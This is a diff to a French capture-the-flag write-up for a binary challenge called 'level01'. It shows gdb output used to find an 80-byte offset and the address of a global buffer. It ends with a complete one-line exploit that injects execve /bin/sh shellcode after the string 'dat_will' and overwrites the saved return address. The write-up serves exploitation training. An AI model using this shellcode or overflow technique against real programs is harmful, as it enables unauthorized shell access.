@@ -3,4 +3,20 @@ Il va compararer les 7 premiers caracteres de la variable globale avec "dat_will
 
 En injectant un shellcode apres "dat_will" et en modifiant l'eip du second fgets par l'adresse de la varibale globale + 7, nous sommes en mesure d'ouvrir un shellcode. 
 
+Pour trouver l'offset, nous allons faire sous gdb:
+(gdb) i f
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048580 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
+(gdb) p 0xffffd70c - 0xffffd6bc
+$1 = 80
+
+Et pour trouver l'addresse de la variable globale:
+(gdb) x/s 0x804a040
+0x804a040 <a_user_name>:	 "dat_wil \n"
+
+Ce qui nous donne l'exploit:
 (python -c 'print "dat_will" + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; python -c 'print "A" * 80 + "\x08\x04\xa0\x48"[::-1]'; cat) | ./level01
